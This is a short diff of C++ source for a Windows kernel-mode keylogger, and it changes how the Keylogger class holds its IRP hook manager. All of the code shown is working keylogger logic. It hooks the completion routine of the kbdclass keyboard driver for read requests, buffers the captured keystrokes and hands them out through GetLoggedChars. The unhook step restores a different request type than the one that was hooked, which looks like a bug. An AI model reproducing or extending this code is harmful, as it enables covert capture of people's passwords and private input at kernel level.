@@ -101,7 +101,7 @@ NTSTATUS HookedKbdclassCompletionRoutine(PDEVICE_OBJECT, PIRP Irp, PVOID Context
 	return STATUS_SUCCESS;
 }
 
-Keylogger::Keylogger(IrpHookManager& HookManager, ULONG BufferSize) : buffer(), hookManager(HookManager), offsetInBuffer(0), bufferLock(), keyloggingInProgress(false) {
+Keylogger::Keylogger(IrpHookManager* HookManager, ULONG BufferSize) : buffer(), hookManager(HookManager), offsetInBuffer(0), bufferLock(), keyloggingInProgress(false) {
 	buffer.Reserve(BufferSize);
 	bufferLock.Init();
 }
@@ -112,7 +112,7 @@ VOID Keylogger::StartLogging() {
 		return;
 	}
 	UNICODE_STRING kbdDriverName = RTL_CONSTANT_STRING(L"\\Driver\\kbdclass");
-	hookManager.InstallCompletionRoutine(&kbdDriverName, HookedKbdclassCompletionRoutine, this, IRP_MJ_READ);
+	hookManager->InstallCompletionRoutine(&kbdDriverName, HookedKbdclassCompletionRoutine, this, IRP_MJ_READ);
 	keyloggingInProgress = true;
 }
 
@@ -139,7 +139,7 @@ VOID Keylogger::GetLoggedChars(char* OutputBuffer, ULONG* BufferLength) {
 
 VOID Keylogger::EndKeylogging() {
 	UNICODE_STRING kbdDriverName = RTL_CONSTANT_STRING(L"\\Driver\\kbdclass");
-	hookManager.RestoreOriginal(&kbdDriverName, IRP_MJ_DEVICE_CONTROL);
+	hookManager->RestoreOriginal(&kbdDriverName, IRP_MJ_DEVICE_CONTROL);
 	offsetInBuffer = 0;
 	RtlZeroMemory(buffer.GetBuffer(), buffer.Size());
 }
